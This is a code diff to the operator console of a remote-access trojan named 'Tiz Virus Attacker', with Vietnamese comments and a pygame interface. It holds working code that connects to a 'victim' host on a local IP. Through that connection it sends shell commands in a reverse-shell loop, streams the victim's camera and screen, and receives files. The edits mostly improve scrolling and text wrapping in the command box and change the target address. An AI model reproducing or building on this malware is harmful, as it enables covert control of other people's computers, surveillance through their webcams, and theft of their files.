@@ -32,7 +32,7 @@ font = pygame.font.Font(None, 36)
 # arguments parser
 def parseargs():
     cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
-    cli_args.add_argument('--host', help="connecting ip, default is localhost'", default='192.168.1.93', type=str)
+    cli_args.add_argument('--host', help="connecting ip, default is localhost'", default='192.168.1.3', type=str)
     cli_args.add_argument('--port', help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2, file transfer = port+3", default=5000, type=int)
     cli_args.add_argument('--shell', help="shell=t revershell on port (default = 5000) / shell=f don't revershell", default="t", type=str)
     cli_args.add_argument('--camera', help="camera=t stream camera on port+1 (default = 5001) / camera=f don't stream",default="t", type=str)
@@ -68,6 +68,7 @@ class Button:
         text_rect = text_surface.get_rect(center=self.rect.center)
         surface.blit(text_surface, text_rect)
 
+import textwrap
 class InputBox:
     def __init__(self, x, y, width, height):
         self.rect = pygame.Rect(x, y, width, height)
@@ -75,11 +76,11 @@ class InputBox:
         self.text = ''
         self.prompt = 'Enter command: '
         self.active = False
-        self.font = pygame.font.Font(None, 25)
+        self.font = pygame.font.Font(None, 20)  # Sử dụng font Arial hỗ trợ Unicode
         self.history = []  # Lưu lịch sử lệnh và kết quả
         self.scroll_offset = 0  # Vị trí cuộn hiện tại
         self.cursor_visible = True  # Con trỏ chuột
-        self.cursor_counter = 0   # Để điều khiển nhấp nháy con trỏ
+        self.cursor_counter = 0  # Để điều khiển nhấp nháy con trỏ
 
     def handle_event(self, event):
         if event.type == pygame.MOUSEBUTTONDOWN:
@@ -91,72 +92,84 @@ class InputBox:
 
         if event.type == pygame.KEYDOWN and self.active:
             if event.key == pygame.K_RETURN:
-                # Xử lý lệnh
-                command = self.text.strip()  # Xóa khoảng trắng không cần thiết
+                command = self.text.strip()
                 result = self.send_command(command)
-                self.history.append(f"$ {command}")  # Thêm lệnh
-                self.history.append(result)  # Thêm kết quả
-                self.text = '' 
-                self.scroll_offset = max(0, len(self.history) * 20 - self.rect.height)  # Cuộn xuống cuối
+                self.history.append(f"$ {command}")
+                self.history.append(result)
+                self.text = ''
+                
+                # Tính số dòng thực tế
+                total_lines = sum(len(textwrap.wrap(line, width=70)) for line in self.history)
+                visible_lines = (self.rect.height - 20) // 20
+
+                # Kiểm tra cuộn
+                if total_lines > visible_lines:
+                    # Cập nhật scroll_offset để luôn cuộn đúng
+                    self.scroll_offset = (total_lines - visible_lines) * 20
+                else:
+                    self.scroll_offset = 0
+
             elif event.key == pygame.K_BACKSPACE:
                 self.text = self.text[:-1]
             else:
                 self.text += event.unicode
 
-        # Điều khiển cuộn (scroll) khi con lăn chuột được sử dụng
-        if event.type == pygame.MOUSEBUTTONDOWN:
+        # Điều khiển cuộn chuột
+        if event.type == pygame.MOUSEBUTTONDOWN and event.button in (4, 5):
             if event.button == 4:  # Cuộn lên
                 self.scroll_offset = max(0, self.scroll_offset - 20)
             elif event.button == 5:  # Cuộn xuống
-                self.scroll_offset = min(len(self.history) * 20, self.scroll_offset + 20)
+                total_lines = sum(len(textwrap.wrap(line, width=50)) for line in self.history)
+                visible_lines = (self.rect.height - 20) // 20
+                max_scroll = max(0, (total_lines - visible_lines) * 20)
+                self.scroll_offset = min(max_scroll, self.scroll_offset + 20)
 
-    def send_command(self, command):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            BUFFER_SIZE = 1024
-            s.connect(('192.168.1.93', 5000))
-            
-            # Gửi lệnh
-            s.send(command.encode())
-            if command.lower() == "exit":
-                return "Disconected."
-
-            # Nhận kết quả từ server
-            results = s.recv(BUFFER_SIZE).decode()
-            s.close()
-            return results  # Trả về kết quả để hiển thị trong vùng nhập lệnh
-        
-        except Exception as e:
-            return f"Error when sending command: {e}"
 
 
     def draw(self, surface):
-        # Xóa và tô lại nền đen
         pygame.draw.rect(surface, BLACK, self.rect)
 
-        # Vẽ lịch sử lệnh với khả năng cuộn
         y_offset = self.rect.y - self.scroll_offset
         for line in self.history:
-            txt_surface = self.font.render(line, True, WHITE)
-            surface.blit(txt_surface, (self.rect.x + 5, y_offset))
-            y_offset += txt_surface.get_height()
+            wrapped_lines = textwrap.wrap(line, width=50)
+            for wrapped_line in wrapped_lines:
+                txt_surface = self.font.render(wrapped_line, True, WHITE)
+                surface.blit(txt_surface, (self.rect.x + 5, y_offset))
+                y_offset += txt_surface.get_height()
 
-        # Hiển thị vùng nhập lệnh hiện tại
+        # Vẽ ký tự "$" trước dòng lệnh
+        dollar_surface = self.font.render('$ ', True, WHITE)
+        surface.blit(dollar_surface, (self.rect.x + 5, y_offset))
+
+        # Vẽ nội dung nhập vào
         txt_surface = self.font.render(self.text, True, WHITE)
-        surface.blit(txt_surface, (self.rect.x + 5, y_offset))
+        surface.blit(txt_surface, (self.rect.x + 20, y_offset))
 
-        # Hiển thị con trỏ nhấp nháy
         if self.active and self.cursor_visible:
-            cursor_x = txt_surface.get_width() + 10
+            cursor_x = 20 + txt_surface.get_width()  # Điều chỉnh vị trí con trỏ
             pygame.draw.rect(surface, WHITE, (self.rect.x + cursor_x, y_offset, 2, txt_surface.get_height()))
 
-        # Cập nhật trạng thái nhấp nháy con trỏ
         self.cursor_counter += 1
         if self.cursor_counter % 60 < 30:
             self.cursor_visible = True
         else:
             self.cursor_visible = False
 
+    def send_command(self, command):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            BUFFER_SIZE = 1024
+            s.connect((options.host, options.port))
+            
+            s.send(command.encode())
+            if command.lower() == "exit":
+                return "Disconnected."
+
+            results = s.recv(BUFFER_SIZE).decode()
+            s.close()
+            return results.strip()
+        except Exception as e:
+            return f"Error when sending command: {e}"
 
 # Create initial displays
 displays = [
@@ -185,18 +198,27 @@ def create_new_display():
     return Display(x, y, 200, 150, f"Display {num_displays + 1}")
 
 # reverse shell receiver
-def R_tcp(host='192.168.1.93', port=5000):
+def R_tcp(selected_host = "192.168.1.3", port=5000):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    BUFFER_SIZE = 1024
-    s.connect((host, port))
-    message = s.recv(BUFFER_SIZE).decode()
+    BUFFER_SIZE = 4096
+    s.connect((selected_host, port))
+    print(f"Connected to victim at {selected_host}:{port}")
+    
     while True:
-        command = input("Enter the command you wanna execute:")
+        command = input("Enter the command you want to execute (or type 'exit' to disconnect): ")
         s.send(command.encode())
+        
         if command.lower() == "exit":
+            print("Exiting reverse shell...")
             break
+        
         results = s.recv(BUFFER_SIZE).decode()
-        print(results)
+        
+        if not results:
+            print("No output received.")
+        else:
+            print(results)
+    
     s.close()
 
 def recvall(sock, length, buffer_size=8192):
@@ -209,7 +231,7 @@ def recvall(sock, length, buffer_size=8192):
     return buf
 
 
-def screenreceiver(host='192.168.1.93', port=5001):
+def screenreceiver(host='192.168.1.3', port=5001):
     global screen_running
     screen_running = True
     with socket.socket() as sock:
@@ -249,7 +271,7 @@ def screenreceiver(host='192.168.1.93', port=5001):
                 print(f"Error receiving/displaying image: {e}")
                 break
 
-def camreceiver(host='192.168.1.93', port=5002):
+def camreceiver(host='192.168.1.3', port=5002):
     global camera_running
     s = socket.socket()
     s.connect((host, port))
@@ -314,12 +336,11 @@ def show_full_screen(display):
     pygame.init()
     font = pygame.font.SysFont(None, 36)
     full_screen = True
+    input_box = InputBox(WIDTH // 4 - 100, HEIGHT // 2 + 160, 590, 130)
     camera_button = Button(WIDTH // 4 - 100, HEIGHT // 2 + 100, 190, 50, "Start Camera", GREEN)
     screen_button = Button(3 * WIDTH // 4 - 100, HEIGHT // 2 + 100, 190, 50, "Start Screen", BLUE)
     file_button = Button(WIDTH // 2 - 100, HEIGHT // 2 + 100, 190, 50, "Receive File", RED)
-    
-    # Cập nhật kích thước InputBox để rộng hơn
-    input_box = InputBox(WIDTH // 4 - 100, HEIGHT // 2 + 160, 590, 130)
+        
     camera_thread = None
     screen_thread = None
 
@@ -357,17 +378,16 @@ def show_full_screen(display):
                         file_thread.start()
 
         screen.fill(WHITE)
+        input_box.draw(screen)
         text_surface = font.render(f"Full Screen: {display.text}", True, BLACK)
         text_rect = text_surface.get_rect(center=(WIDTH // 2, HEIGHT // 4))
         screen.blit(text_surface, text_rect)
-        
+              
         camera_button.draw(screen)
         screen_button.draw(screen)
         file_button.draw(screen)
         back_button.draw(screen, 0)
         
-        input_box.draw(screen)
-
         pygame.display.flip()
 
     if screen_thread:
